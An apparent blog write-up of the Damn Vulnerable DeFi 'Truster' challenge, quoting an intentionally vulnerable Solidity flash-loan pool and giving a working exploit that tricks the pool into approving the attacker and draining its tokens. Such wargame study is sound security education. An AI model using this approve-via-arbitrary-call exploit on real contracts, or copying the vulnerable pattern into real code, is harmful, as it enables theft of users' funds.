---
title: 'Damn Vulnerable DeFi Challenge #3 Solution — Truster'
excerpt: 'Damn Vulnerable DeFi is the war game created by @tinchoabbate to learn offensive security of DeFi smart contracts.</br></br>Our end goal here is to attack the pool to drain all the 1 million DTV tokens available in the balance.'
coverImage:
  url: '/assets/blog/ethereum.jpg'
  credit:
    name: Nenad Novaković
    url: https://unsplash.com/@dvlden
date: '2020-04-10T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethereum.jpg'
---

[Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/index.html) is the war game created by [@tinchoabbate](https://twitter.com/tinchoabbate) to learn offensive security of DeFi smart contracts.

Throughout numerous challenges, you will build the skills to become a bug hunter or security auditor in the space.

## Challenge #3 — Truster

> More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
>
> Currently the pool has 1 million DVT tokens in balance. And you have nothing.
>
> But don’t worry, you might be able to take them all from the pool. In a single transaction.

- [See contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.0.0/contracts/truster)
- [Hack it](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/truster/truster.challenge.js)

## The attacker end goal

Our end goal here is to attack the pool to drain all the 1 million DTV tokens available in the balance.

Given the context of the challenge, we will leverage the **free flash loan mechanism** of the landing pool to steal all the funds.

## Study the contracts

### `TrusterLenderPool`

The contract has only one method inside called `flashLoan`.

```solidity
// Don't use this code in production
// This is an insecure code part of https://www.damnvulnerabledefi.xyz/ challenges

function flashLoan(
    uint256 borrowAmount,
    address borrower,
    address target,
    bytes calldata data
)
    external
    nonReentrant
{
    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

    damnValuableToken.transfer(borrower, borrowAmount);
    target.functionCall(data);

    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```

The function takes in input four parameters:

- `borrowAmount`: the number of tokens to send to the `borrower` address
- `borrower`: the address that is borrowing the tokens and that will receive the amount of token borrowed
- `target`: the address of the contract on which the `OpenZeppelin Address.functionCall` will be executed on
- `data`: the byte payload that will be used to `Address.functionCall`

What else can we see looking at the code?

- The function has `nonReentrant` function modifier, so we can assume that is not prone to reentrancy attacks
- it’s **not checking** the `borrower` or `target` address
- It’s **not checking** that the `borrowAmount` is 0
- Is checking that the balance of the pool has at least `borrowAmount` tokens
- Transfer the `borrowAmount` to the `borrower` address
- Execute a `functionCall` with `data` as parameter on the target address
- And at the end, verify that the final balance of the contract is greater than the starting balance

So, we cannot

- steal funds using reentrancy
- steal funds directly because it will check at the end if we have sent back all the funds

But we have three hints:

- it’s not checking that the `borrowAmount` is zero
- it’s not checking the `borrower` or `target` address
- and it’s executing an external call to the `target` address passing an arbitrary `data` payload to it

Let’s look at the source code of [Address.functionCall](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol). Following the code we see that the final code that will be executed is

```solidity
require(address(this).balance >= value, "Address: insufficient balance for call");
require(isContract(target), "Address: call to non-contract");
(bool success, bytes memory returndata) = target.call{value: value}(data);
return verifyCallResult(success, returndata, errorMessage);
```

Given this information, we know that the TrusterLenderPool contract will execute `target.call{value: value}(data);` using its own context.

This means that that specific arbitrary function executed on `target` is like if it will be **executed directly by** the **TrusterLenderPool** contract!

## Solution code

What function should we make the `TrusterLenderPool` execute that will allow us to steal all the funds?

We need to execute the [DamnVulnerableToken.approve(address spender, uint256 amount)](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L126-L140) with

- spender = attacker address
- amount = the balance of the lending pool

This will allow the attacker to transfer all the DVT token owned by the LendingPool to the attacker itself!

With all the information that we have, we can:

- Call the `flashLoan` function asking to borrow 0 token, so we will not need to pay back anything. This is important because the attacker does not own any DVT token.
- Call the `flashLoan` with target as the DVT token address to execute the call method on the Token contract itself
- Construct the `data` payload to make the `TrusterLenderPool` to call the DVT approve method `bytes memory data = abi.encodeWithSignature(“approve(address,uint256)”, attacker, poolBalance);`

```solidity
function exploit() internal override {
    /** CODE YOUR EXPLOIT HERE */
    uint256 poolBalance = token.balanceOf(address(pool));
    // Act as the attacker
    vm.prank(attacker);
    // make the pool approve the attacker to manage the whole pool balance while taking a free loan
    bytes memory attackCallData = abi.encodeWithSignature("approve(address,uint256)", attacker, poolBalance);
    pool.flashLoan(0, attacker, address(token), attackCallData);
    // now steal all the funds
    vm.prank(attacker);
    token.transferFrom(address(pool), attacker, poolBalance);
}
```

You can find the full solution on GitHub, looking at [Truster.t.sol](https://github.com/StErMi/forge-damn-vulnerable-defi/blob/main/src/test/truster/Truster.t.sol)

If you want to try yourself locally, just execute `forge test — match-contract TrusterTest -vv`

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION
